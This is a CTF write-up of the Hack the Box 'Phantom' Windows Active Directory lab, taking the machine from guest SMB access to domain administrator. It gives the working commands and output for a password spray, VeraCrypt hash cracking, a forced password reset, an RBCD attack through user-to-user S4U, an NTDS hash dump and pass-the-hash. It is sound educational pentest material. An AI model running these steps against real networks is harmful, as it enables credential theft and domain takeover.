## Overview

The "Phantom" CTF simulates a Windows Active Directory network, typical of corporate environments. This writeup details the steps taken to gain unauthorized access and compromise the domain controller with a hybrid aspect of typical pentesting professional-esque reporting. 

As such, not all typical extensive enumeration steps that were performed are documented.


## Tools Used
**nmap:** https://nmap.org/

**NetExec:** https://github.com/Pennyw0rth/NetExec

**BloodHound (legacy):** https://github.com/SpecterOps/BloodHound-Legacy

**RustHound:** https://github.com/NH-RED-TEAM/RustHound

**VeraCrypt:** https://veracrypt.io/en/Home.html

**hashcat:** https://hashcat.net/hashcat/






## Technical Writeup

### Introduction

"Phantom" is a medium-difficulty Windows Active Directory machine on **Hack the Box**. As usual, the objective was to achieve both **user** and **Root/Administrator** flags. This writeup will detail the methodology and tools used to compromise the target.

### Initial Enumeration and Reconnaissance

  
My initial reconnaissance phase focused on gathering as much information as possible about the target system, `10.129.234.63`.

#### Nmap Scan
*   **Command**: `nmap -sC -sV 10.129.234.63 -oA Outputs/nmap/initial`

An `nmap` scan revealed a standard Windows Domain Controller setup, with several key services open:
*   **Port 53 (DNS)**: `Simple DNS Plus`
*   **Port 88 (Kerberos)**: `Microsoft Windows Kerberos`
*   **Port 135 (MSRPC)**: `Microsoft Windows RPC`
*   **Port 139 (NetBIOS-SSN)**: `Microsoft Windows netbios-ssn`
*   **Port 389 (LDAP)**: `Microsoft Windows Active Directory LDAP (Domain: phantom.vl)`
*   **Port 445 (SMB)**: `Microsoft Windows` (SMB signing enabled and required)
*   **Port 3389 (RDP)**: `Microsoft Terminal Services`

The `nmap` output immediately provided crucial domain information: `phantom.vl` and `DC.phantom.vl`.

For a full breakdown of the Nmap scan, see the [HTML output](https://html-preview.github.io/?url=https://github.com/rtj-dev/CTF-Writeups/blob/main/Active-Directory/Phantom/Outputs/nmap/initial_syn_scan.html).



#### SMB Enumeration with NetExec

With SMB port 445 open, I proceeded to enumerate shares and users using `NetExec`.

**1. Null/Guest Access Check:**

Initially, I attempted to authenticate with null and guest credentials.
*   **Command**: `nxc smb 10.129.234.63 -u 'a' -p '' --log Outputs/nxc/guest_scan.txt`

```
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.234.63   445    DC               [+] phantom.vl\a: (Guest)
```
The output confirmed that both guest and null bindings were working, indicating potential for further enumeration with guest privileges.

**2. Listing Shares:**

Leveraging the guest access, we can list available SMB shares.
*   **Command**: `nxc smb 10.129.234.63 -u 'a' -p '' --shares --log Outputs/nxc/guest_shares.txt`

```
SMB         10.129.234.63   445    DC               [*] Enumerated shares
SMB         10.129.234.63   445    DC               Share           Permissions     Remark
SMB         10.129.234.63   445    DC               -----           -----------     ------
SMB         10.129.234.63   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.63   445    DC               C$                              Default share
SMB         10.129.234.63   445    DC               Departments Share
SMB         10.129.234.63   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.63   445    DC               NETLOGON                        Logon server share
SMB         10.129.234.63   445    DC               Public          READ
SMB         10.129.234.63   445    DC               SYSVOL                          Logon server share
```
Note the `Public` share, with `READ` permissions, something to note for further enumeration

**3. Listing Users via RID Bruteforce:**

Although direct user listing wasn't successful with guest access, a RID bruteforce attack is a noisy but often fruitful option.
*   **Command**: `nxc smb 10.129.234.63 -u 'a' -p '' --rid-brute --log Outputs/nxc/rid_scan.txt`
  
```
<SNIP>
SMB         10.129.234.63   445    DC               1103: PHANTOM\svc_sspr (SidTypeUser)
SMB         10.129.234.63   445    DC               1104: PHANTOM\TechSupports (SidTypeGroup)
SMB         10.129.234.63   445    DC               1105: PHANTOM\Server Admins (SidTypeGroup)
SMB         10.129.234.63   445    DC               1106: PHANTOM\ICT Security (SidTypeGroup)
SMB         10.129.234.63   445    DC               1107: PHANTOM\DevOps (SidTypeGroup)
SMB         10.129.234.63   445    DC               1108: PHANTOM\Accountants (SidTypeGroup)
SMB         10.129.234.63   445    DC               1109: PHANTOM\FinManagers (SidTypeGroup)
SMB         10.129.234.63   445    DC               1110: PHANTOM\EmployeeRelations (SidTypeGroup)
SMB         10.129.234.63   445    DC               1111: PHANTOM\HRManagers (SidTypeGroup)
SMB         10.129.234.63   445    DC               1112: PHANTOM\rnichols (SidTypeUser)
SMB         10.129.234.63   445    DC               1113: PHANTOM\pharrison (SidTypeUser)
SMB         10.129.234.63   445    DC               1114: PHANTOM\wsilva (SidTypeUser)
SMB         10.129.234.63   445    DC               1115: PHANTOM\elynch (SidTypeUser)
SMB         10.129.234.63   445    DC               1116: PHANTOM\nhamilton (SidTypeUser)
SMB         10.129.234.63   445    DC               1117: PHANTOM\lstanley (SidTypeUser)
SMB         10.129.234.63   445    DC               1118: PHANTOM\bbarnes (SidTypeUser)
SMB         10.129.234.63   445    DC               1119: PHANTOM\cjones (SidTypeUser)
SMB         10.129.234.63   445    DC               1120: PHANTOM\agarcia (SidTypeUser)
SMB         10.129.234.63   445    DC               1121: PHANTOM\ppayne (SidTypeUser)
SMB         10.129.234.63   445    DC               1122: PHANTOM\ibryant (SidTypeUser)
SMB         10.129.234.63   445    DC               1123: PHANTOM\ssteward (SidTypeUser)
SMB         10.129.234.63   445    DC               1124: PHANTOM\wstewart (SidTypeUser)
SMB         10.129.234.63   445    DC               1125: PHANTOM\vhoward (SidTypeUser)
SMB         10.129.234.63   445    DC               1126: PHANTOM\crose (SidTypeUser)
SMB         10.129.234.63   445    DC               1127: PHANTOM\twright (SidTypeUser)
SMB         10.129.234.63   445    DC               1128: PHANTOM\fhanson (SidTypeUser)
SMB         10.129.234.63   445    DC               1129: PHANTOM\cferguson (SidTypeUser)
SMB         10.129.234.63   445    DC               1130: PHANTOM\alucas (SidTypeUser)
<SNIP>
```
The scan has given a good picture of how the domain is strucutred, groups for IT Staff, HR, Finance (etc.) and a good list of users to leverage for further enumeration and testing.
An interesting finding is `svc_sspr` (RID 1103), which often indicates a service account used for Self-Service Password Reset. For the complete RID scan output, refer to [rid_scan.txt](Outputs/nxc/rid_scan.txt).

**4. Exploring Shares:**

Spidering available shares is a convenient way to list and/or download all acessible files for which we have access.
*  **Command:** `nxc smb 10.129.234.63 -u 'a' -p '' -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=./spider --log spider_shares.txt`
```
SPIDER_PLUS 10.129.234.63   445    DC               [+] Saved share-file metadata to "./spider/10.129.234.63.json".
SPIDER_PLUS 10.129.234.63   445    DC               [*] SMB Shares:           7 (ADMIN$, C$, Departments Share, IPC$, NETLOGON, Public, SYSVOL)
SPIDER_PLUS 10.129.234.63   445    DC               [*] SMB Readable Shares:  2 (IPC$, Public)
SPIDER_PLUS 10.129.234.63   445    DC               [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.234.63   445    DC               [*] Total folders found:  0
SPIDER_PLUS 10.129.234.63   445    DC               [*] Total files found:    1
SPIDER_PLUS 10.129.234.63   445    DC               [*] File size average:    14.22 KB
SPIDER_PLUS 10.129.234.63   445    DC               [*] File size min:        14.22 KB
SPIDER_PLUS 10.129.234.63   445    DC               [*] File size max:        14.22 KB
SPIDER_PLUS 10.129.234.63   445    DC               [*] File unique exts:     1 (eml)
SPIDER_PLUS 10.129.234.63   445    DC               [*] Downloads successful: 1
SPIDER_PLUS 10.129.234.63   445    DC               [+] All files processed successfully.
```
Exploring the metadata report has given a single file to investiage, [tech_support_email.eml](Outputs/nxc/tech_support_email.eml).

```
{
    "Public": {
        "tech_support_email.eml": {
            "atime_epoch": "2024-07-06 17:08:50",
            "ctime_epoch": "2024-07-06 17:08:50",
            "mtime_epoch": "2024-07-06 17:09:28",
            "size": "14.22 KB"
        }
    }
}
```
For visibility, we'll use an .eml viewer and explore what we have.
![EML Preview](Outputs/Screenshots/support_eml.png)
An email from `alucas@phantom.vl`, who we can note was also listed in our user enumeration earlier, to `techsupport@phantom.vl`

Viewing the PDF attached gives us a critical finding `Password: Ph4nt0m@5t4rt!` for a potential password spray against our user list.
![welcome_template](Outputs/Screenshots/onboarding_pdf.png) 

### Active Exploitation
  **Password Spray** 
  
  Using the onboarding password, we'll spray across our users found in the RID bruteforce, find the full output here: [spray.txt](Outputs/nxc/spray.txt)

*   **Command**: `nxc smb 10.129.234.63 -u ridusers -p 'Ph4nt0m@5t4rt!' --continue-on-success --log ./Outputs/nxc/spray.txt`
```
<SNIP>
SMB         10.129.234.63   445    DC               [-] phantom.vl\ppayne:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [+] phantom.vl\ibryant:Ph4nt0m@5t4rt!
SMB         10.129.234.63   445    DC               [-] phantom.vl\ssteward:Ph4nt0m@5t4rt! STATUS_LOGON_FAILURE
</SNIP>
```
A positive hit for `ibryant`, we now have active credentials to iterate over our enumeration process again.

### Further Enumeration


**Exploring Shares**
  
*   **Command**: `nxc smb 10.129.234.63 -u ibryant -p 'Ph4nt0m@5t4rt!' --users --log ibryant_shares.txt'`
```
SMB         10.129.234.63   445    DC               [*] Enumerated shares
SMB         10.129.234.63   445    DC               Share           Permissions     Remark
SMB         10.129.234.63   445    DC               -----           -----------     ------
SMB         10.129.234.63   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.63   445    DC               C$                              Default share
SMB         10.129.234.63   445    DC               Departments Share READ
SMB         10.129.234.63   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.63   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.234.63   445    DC               Public          READ
SMB         10.129.234.63   445    DC               SYSVOL          READ            Logon server share
```
Taking another look at shares, we can see `ibryant` has `READ` access to the `Departments Share` which we will immediately explore.

```
Finance/Expense_Reports.pdf
Finance/Invoice-Template.pdf
Finance/TaxForm.pdf
HR/Employee-Emergency-Contact-Form.pdf
HR/EmployeeHandbook.pdf
HR/Health_Safety_Information.pdf
HR/NDA_Template.pdf
IT/mRemoteNG-Installer-1.76.20.24615.msi
IT/TeamViewerQS_x64.exe
IT/TeamViewer_Setup_x64.exe
IT/veracrypt-1.26.7-Ubuntu-22.04-amd64.deb
IT/Wireshark-4.2.5-x64.exe
IT/Backup/IT_BACKUP_201123.hc
```
Spidering and downloading the share contents displays a range of departmental resources. While the rest were unremarkable, `IT` provides some interesting insights.

- **Veracrypt** `veracrypt-1.26.7-Ubuntu-22.04-amd64.deb` presence implies some use of encrypted storage.

- **IT/Backup** `IT_BACKUP_201123.hc` in the context of veracrypt, tells us this is an encrypted container/drive. We'll take note of this and explore later.

**Bloodhound**

Using my collector of choice `RustHound`, we'll look to get a overview of the domain and any potential weak DACLS or potential high value targets with `BloodHound`.

*   **Command**: `rusthound -u ibryant -p 'Ph4nt0m@5t4rt!' --domain phantom.vl --ldapip 10.129.234.63 --zip --output ./BloohoundIngest`
```
<SNIP>
[2025-10-13T22:07:35Z INFO  rusthound::json::maker] 30 users parsed!
[2025-10-13T22:07:35Z INFO  rusthound::json::maker] 69 groups parsed!
[2025-10-13T22:07:35Z INFO  rusthound::json::maker] 1 computers parsed!
[2025-10-13T22:07:35Z INFO  rusthound::json::maker] 5 ous parsed!
[2025-10-13T22:07:35Z INFO  rusthound::json::maker] 1 domains parsed!
[2025-10-13T22:07:35Z INFO  rusthound::json::maker] 2 gpos parsed!
[2025-10-13T22:07:35Z INFO  rusthound::json::maker] 21 containers parsed!
[2025-10-13T22:07:35Z INFO  rusthound::json::maker] ./BloohoundIngest/20251013230735_phantom-vl_rusthound.zip created!
</SNIP>
```
**Immediate Findings**

Using previous informaiton obtained and Bloodhound's ability to graphically present data, provides a strong overview of potential targets and/or weaknesses.

**Owned User**

A quick look into `ibryant` reveals nothing remarkable, but provides useful info on our group membership, immediate surroundings and our current limitaitons.

**[Ibryant Shortest Path](Outputs/Screenshots/ibryant_shortest.png)**

**[Tech Support Group](Outputs/Screenshots/techsupport_shortest.png)**

**Future HVTs**

Looking outside our current control, highlights some very interesting findings and the likely potential pathway for full domain compromise.

**SVC_SSPR**

This service account we discovered earlier, not only has `REMOTE MANAGEMNT USERS` membership, but also has a direct route into `ICT Security` through `ForceChangePassword` over `rnichols`.

[SVC_SPR_Control](Outputs/Screenshots/svc_sspr_control.png)

**ICT Security**

From here, we'd have a potential RBCD DACL directly over the DC with `AddAllowedToAct`, making `svc_sspr` priority one.

![ICT_SECURITY](Outputs/Screenshots/RBCD.png)

### Privilege Escalation



**Veracrypt**

Returning to our veracrypt container, using external resources, we can learn that the first 512 bytes contain the encrypted volume header we can then feed to hashcat.

*   **Command**: `dd if=./IT_BACKUP_201123.hc of=./hash bs=512 count=1`

**Cracking**

An important factor to note when cracking is speed - running through a popular list like rockyou.txt over VeraCrypt SHA512 + XTS 1024 bit will take a long time.

Here we'll take note of the following info provided by the HTB overlords.
![HTB_Notice](Outputs/Screenshots/info.png)

We'll use crunch (https://github.com/crunchsec/crunch), to generate a simple wordlist based on these exact parameters.
*   **Command**:`crunch 12 12 -t 'Phantom202%^' -o wordlist.txt`

**Hashcat***
*   **Command**: `hashcat -a 0 -m 13722 hash wordlist.txt`
```
hash:Phantom2023!
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13722 (VeraCrypt SHA512 + XTS 1024 bit (legacy))
Hash.Target......: hash
Time.Started.....: Fri Oct 17 09:09:08 2025 (6 secs)
Time.Estimated...: Fri Oct 17 09:09:14 2025 (0 secs)
```

**Veracrypt**
With the container password cracked, we'll use the veracrypt console to mount `IT_BACKUP_201123.hc`. Note, if you're running inside a container, ensure you have FUSE access or mount and decrypt externally.

*   **Command**: `veracrypt IT_BACKUP_201123.hc /mnt/ --password='Phantom2023!'z``
```
├── azure_vms_0805.json
├── azure_vms_1023.json
├── azure_vms_1104.json
├── azure_vms_1123.json
├── splunk_logs_1003
├── splunk_logs_1102
├── splunk_logs1203
├── ticketing_system_backup.zip
└── vyos_backup.tar.gz
```
I'll unzip and untar `ticketing_system_backup.zip` and `vyos_backup.tar.gz` to have a clean tree structure to recursively grep through with `ripgrep`

We'll try a basic "password" query for now to save filtering through thousands of lines

**Command**: `rg -i "password"`

We get a promising hit right at the end of stdout.
```
<SNIP>
run/vyatta/config/config.json
{"local-users": {"username": {"lstanley": {"password": "gB6XTcqVP5MlP7Rc"}}}
</SNIP>
```

Referring back to `BloodHound`, `lstanley` does not have any remarkable transitive object control. However their membership of `SERVER ADMINS` raises implications, though nothing we can evidently see yet.

[LStanley Membership](Outputs/Screenshots/lstanley.png)


We'll test these credentials with `NetExec` across the domain. 

**Command**: `nxc smb 10.129.234.63 -u ridusers -p 'gB6XTcqVP5MlP7Rc' --continue-on-success`

```
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.129.234.63   445    DC               [-] phantom.vl\Administrator:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\Guest:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\krbtgt:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\DC$:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [+] phantom.vl\svc_sspr:gB6XTcqVP5MlP7Rc
SMB         10.129.234.63   445    DC               [-] phantom.vl\rnichols:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\pharrison:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\wsilva:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\elynch:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\nhamilton:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
SMB         10.129.234.63   445    DC               [-] phantom.vl\lstanley:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
```

No match for `lstanley`, but we've got a hit on our HVT `svc_sspr`.


**SVC_SSPR**

With our attack path already scoped earlier, we can also remember `svc_sspr` is a member of `REMOTE MANAGEMENT USERS`, so we should be able to get an `evilwin-rm` shell on the machine.

**Command**: `evil-winrm -i phantom.vl -u svc_sspr -p gB6XTcqVP5MlP7Rc`
```
*Evil-WinRM* PS C:\Users\svc_sspr\Desktop> ls


    Directory: C:\Users\svc_sspr\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        10/17/2025   1:52 AM             34 user.txt


*Evil-WinRM* PS C:\Users\svc_sspr\Desktop> cat user.txt
5c66a7ab1971f8793c86676296abbb8d
```

User flag obtained.



**Execution**

We currently own `svc_sspr`, and as detailed earlier, we can see a clear path to domain compromise though `wsilva` and `ICT SECURITY`.

Our first action is to use our [ForceChangePassword](Outputs/Screenshots/svc_sspr_control.png) over `wsilva` to reset their password and authenticate as them, moving us along our attack path.



**Command**: `bloodyAD -d phantom.vl -u svc_sspr -p gB6XTcqVP5MlP7Rc --host 10.129.234.63 set password wsilva Summer2025`

```
[+] Password changed successfully!
```

With `wsilva` now under our control, we now have delegated [AddAllowedToAct](Outputs/Screenshots/RBCD.png) over `DC.PHANTOM.VL`, though our membership of `ICT SECURITY`.

**RBCD**

Resource Based Constrained Delegation is one of a few delegation oriented kerberos attacks, though a legitimate kerberos process, it effectively allows a resource

[The Hacker Recipes](https://www.thehacker.recipes/) has a brilliant [article](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd) for our flavor of delegation.

**Command:** `bloodyAD -d phantom.vl -u wsilva -p Summer2025 --host 10.129.234.63 add computer proxy proxypass`

```
Traceback (most recent call last):
  File "/root/.local/bin/bloodyAD", line 7, in <module>
    sys.exit(main())
             ^^^^^^
  File "/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/main.py", line 216, in main
    output = args.func(conn, **params)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/cli_modules/add.py", line 213, in computer
    conn.ldap.bloodyadd(computer_dn, attributes=attr)
  File "/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/network/ldap.py", line 213, in bloodyadd
    raise err
msldap.commons.exceptions.LDAPAddException: LDAP Add operation failed on DN cn=proxy,CN=Computers,DC=phantom,DC=vl! Result code: "unwillingToPerform" Reason: "b'0000216D: SvcErr: DSID-031A126C, problem 5003 (WILL_NOT_PERFORM), data 0\n\x00'"
```
This is direct result of not checking our quota or `ms-DS-MachineAccountQuota:`, which we find to be 0.

**Command:** `bloodyAD -d phantom.vl -u wsilva -p Summer2025 --host 10.129.234.63 get object 'DC=phantom,DC=vl' --attr ms-DS-MachineAccountQuota`
```
distinguishedName: DC=phantom,DC=vl
ms-DS-MachineAccountQuota: 0
```

Instead, we'll have to reference work by [James Forshaw](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html) on how to leverage a user account instead.

Following the instructions, we need to add `wsilva` to `DC.PHANTOM.VL`'s  `msDS-AllowedToActOnBehalfOfOtherIdentity` which we can do with `bloodyAD`'s sub-module `rbcd`.

**Command:** `bloodyAD -d phantom.vl -u wsilva -p Summer2025 --host 10.129.234.63 add rbcd DC$ wsilva`
```
[!] No security descriptor has been returned, a new one will be created
[+] wsilva can now impersonate users on DC$ via S4U2Proxy
```
This effectively updates the attribute with our SID, allowing our user account to perform S4U2proxy to `DC.PHANTOM.VL`,
which we can confirm with:
**Command:** `bloodyAD -d phantom.vl -u wsilva -p Summer2025 --host 10.129.234.63 get object DC$ --attr msDS-AllowedToActOnBehalfOfOtherIdentity --resolve-sd`
```
distinguishedName: CN=DC,OU=Domain Controllers,DC=phantom,DC=vl
msDS-AllowedToActOnBehalfOfOtherIdentity.Owner: BUILTIN_ADMINISTRATORS
msDS-AllowedToActOnBehalfOfOtherIdentity.Control: DACL_PRESENT|SELF_RELATIVE
msDS-AllowedToActOnBehalfOfOtherIdentity.ACL.Type: == ALLOWED ==
msDS-AllowedToActOnBehalfOfOtherIdentity.ACL.Trustee: wsilva
msDS-AllowedToActOnBehalfOfOtherIdentity.ACL.Right: CONTROL_ACCESS
msDS-AllowedToActOnBehalfOfOtherIdentity.ACL.ObjectType: Self
msDS-AllowedToActOnBehalfOfOtherIdentity.ACL.Flags: CONTAINER_INHERIT; OBJECT_INHERIT
```

With this in place, we need `wsilva`’s Ticket Granting Ticket (TGT) and its session key to manipulate the password hash.

**Command:** `NTLM=$(echo -n 'Summer2025' | iconv -f UTF-8 -t UTF-16LE | openssl dgst -md4 | awk '{print $2}')` 

This will calculate the NTLM hash of `Summer2025`, by converting it from UTF-8 to UTF-16LE with `iconv`, which is then piped to `openssl` to generate an md4 hash (NTLM), which awk will then grab and set as our `$NTLM` variable.

You may not need to do this, in my case, I needed to force a RC4-based TGT, which should yield a 32-character session key, as a plaintext password `Summer2025` generates AES256 64-character key, which is not compatible with the next steps.

```
echo $NTLM
5f695056521900e992a6366aabb446a3
```
With our NTLM hash, we can now proceed with requesting a TGT.

**Command:** `getTGT.py -hashes :$NTLM phantom.vl/wsilva -dc-ip 10.129.234.63`

This next step is **critical**, we must change `wsilva`’s Password Hash to the TGT Session Key, which will enable S4U2self + U2U without an SPN, completing our RBCD requirements.

First we'll extract our session key from our TGT, which we can quickly grep with the following.

**Command:** `describeTicket.py wsilva.ccache | grep 'Ticket Session Key`
```
[*] Ticket Session Key            : 098710b2cb0989cb38839638c24cd154
```

Using `changepasswd.py` we can cleanly handle setting the password as our NTLM hash. Note that this will break normal user functionality.
**Command:** `changepasswd.py -newhashes :098710b2cb0989cb38839638c24cd154 phantom.vl/wsilva:Summer2025@10.129.234.63`
```
[*] Changing the password of phantom.vl\wsilva
[*] Connecting to DCE/RPC as phantom.vl\wsilva
[*] Password was changed successfully.
[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
```

With this set, our user account now is effectively a service account, but without needing an spn, meaning all of our steps are now complete to impersonate Administrator. Again, I absolutely recommend reading [this]([James Forshaw](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)) to understand how this works.
`KRB5CCNAME=wsilva.ccache getST.py -u2u -impersonate Administrator -spn cifs/DC.phantom.vl phantom.vl/wsilva -k -no-pass`
```
Impacket (Exegol fork) v0.13.0.dev0+20250723.125503.b5db2dd7 - Copyright Fortra, LLC and its affiliated companies

[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache
```
`getST.py` is used to request a kerberos service ticket 
`-u2u` enables the User-to-User kerberos protocol, which allows a user to authenticate to another user or service using a TGT.
`impersonate Administrator` here we specifcy the service ticket should be requested on behalf of the Administrator account, leveraging S4U2self.
`-spn cifs/DC.phantom.vl` requests a service ticket for cifs for the DC, which we'll leverage to use SMB later.
`-k -no-pass` is just to indicate we want to use our .ccache and not a password.

We now effectively have free reign as Administrator, to quickly gain as shell over winrm, we can dump `Administrator`'s hash straight from ntds.
**Command:** `KRB5CCNAME=Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache nxc smb dc.phantom.vl --use-kcache --ntds --user Administrator`

```
KRB5CCNAME=Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache nxc smb dc.phantom.vl --use-kcache --ntds --user Administrator
SMB         dc.phantom.vl   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         dc.phantom.vl   445    DC               [+] phantom.vl\Administrator from ccache (admin)
SMB         dc.phantom.vl   445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         dc.phantom.vl   445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:aa2abd9db4f5984e657f834484512117:::
SMB         dc.phantom.vl   445    DC               [+] Dumped 1 NTDS hashes to /root/.nxc/logs/ntds/dc.phantom.vl_None_2025-10-17_130531.ntds of which 1 were added to the database
SMB         dc.phantom.vl   445    DC               [*] To extract only enabled accounts from the output file, run the following command:
SMB         dc.phantom.vl   445    DC               [*] cat /root/.nxc/logs/ntds/dc.phantom.vl_None_2025-10-17_130531.ntds | grep -iv disabled | cut -d ':' -f1
SMB         dc.phantom.vl   445    DC               [*] grep -iv disabled /root/.nxc/logs/ntds/dc.phantom.vl_None_2025-10-17_130531.ntds | cut -d ':' -f1
```

**Command:** `evil-winrm -i dc.phantom.vl -u administrator -H aa2abd9db4f5984e657f834484512117`
```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
60d108263adf1769459769c8ddb6efab
```

Root flag obtained.


### Summary

*   **Initial Access**: (Details to be filled in after exploitation)
*   **Lateral Movement**: (Details to be filled in)
*   **Domain Admin**: (Details to be filled in)


### Mitigations



### Lessons Learned


